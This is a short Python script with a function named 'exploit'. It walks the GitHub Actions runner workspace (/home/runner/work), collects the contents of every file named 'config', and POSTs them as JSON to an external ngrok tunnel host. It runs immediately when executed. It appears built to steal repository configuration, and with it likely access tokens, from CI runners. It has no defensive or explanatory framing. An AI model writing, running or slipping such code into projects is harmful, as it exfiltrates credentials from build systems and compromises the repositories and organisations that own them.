import os
import time
import json
import http.client

def exploit(host_port):
    configs = {}

    for root, _, files in os.walk("/home/runner/work"):
        if "config" in files:
            path = os.path.join(root, "config")
            with open(path) as f:
                configs[path] = f.read()

    headers = {"content-type": "application/json"}
    params = json.dumps({"configs": configs})

    conn = http.client.HTTPConnection(host_port)
    conn.request("POST", "", params, headers)
    response = conn.getresponse()
    conn.close()

exploit("a062-106-213-84-47.in.ngrok.io:443")
